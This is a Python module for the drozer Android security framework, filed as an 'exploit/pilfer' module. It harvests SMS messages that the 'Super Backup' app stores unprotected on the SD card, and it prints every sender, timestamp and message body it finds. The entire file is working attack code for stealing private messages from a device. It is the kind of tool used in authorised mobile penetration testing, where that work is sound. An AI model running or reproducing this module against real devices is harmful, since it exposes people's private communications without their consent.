import time

from xml.etree import ElementTree

from mwr.common import fs
from drozer.modules import common, Module

class SMSes(Module, common.FileSystem, common.ClassLoader):
    
    name = "Grab SMS messages exported by Super Backup"
    description = """Grabs SMS messages backed up to the SD card by 'Super Backup : SMS & Contacts' (com.idea.backup.smscontacts)."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-17"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "thirdparty", "idea", "superbackup"]
    
    __directory = "/mnt/sdcard/SmsContactsBackup/sms"
    
    def execute(self, arguments):
        dumps = self.listFiles(self.__directory)
        
        if dumps != None:
            for dump in dumps:
                data = self.readFile("/".join([self.__directory, str(dump)]))
                
                self.stdout.write("SMS Backup: %s\n" % str(dump))
                xml = ElementTree.fromstring(data)
                
                for sms in xml.findall('sms'):
                    recvd = time.gmtime(float(sms.attrib['date']) / 1000)
                    
                    self.stdout.write("  from %s, %4d-%02d-%02d %02d:%02d:%02d%s\n" % (sms.attrib['address'], recvd.tm_year, recvd.tm_mon, recvd.tm_mday, recvd.tm_hour, recvd.tm_min, recvd.tm_sec, sms.attrib['read'] != '1' and "*" or ""))
                    self.stdout.write("    %s\n\n" % sms.attrib['body'])
                    
